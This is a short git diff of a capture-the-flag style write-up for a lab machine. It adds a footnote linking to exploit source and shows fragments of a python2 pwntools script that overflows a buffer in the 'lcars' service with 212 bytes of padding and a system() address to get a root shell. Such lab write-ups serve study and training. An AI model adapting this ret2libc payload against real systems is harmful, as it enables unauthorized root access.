@@ -898,7 +898,8 @@ Technically, ```212*'A' + system + exit + sh``` should spawn a root shell.
 
 ### Root Access
 With the previous findings and the open port 32812 running the vulnerable service, the following python script was 
-written to spawn a root shell, by exploiting the buffer overflow on *lcars*.
+written to spawn a root shell, by exploiting the buffer overflow on *lcars*. 
+Source code[^footnote]
 
 ```python
 #!/usr/bin/env python2
@@ -909,8 +910,10 @@ from pwn import *
 RHOST = '10.10.10.61'
 RPORT = 32812
 
+
 def conv (num):
     return struct.pack ('<I',num)
+
 
 payload = 'A' * 212
 payload += conv (0xf7e4c060) # system()
@@ -929,3 +932,6 @@ sess.interactive ()
 Executing the script, spawned a root shell back to the attacking host as shown in the screenshot given below.
 
 ![Root Shell](/assets/img/posts/enterprise/rootShell.png)
+
+## Footnotes
+[^footnote]:[https://github.com/pwnd-root/exploits-and-stuff/blob/master/lcarsRoot.py](https://github.com/pwnd-root/exploits-and-stuff/blob/master/lcarsRoot.py) 
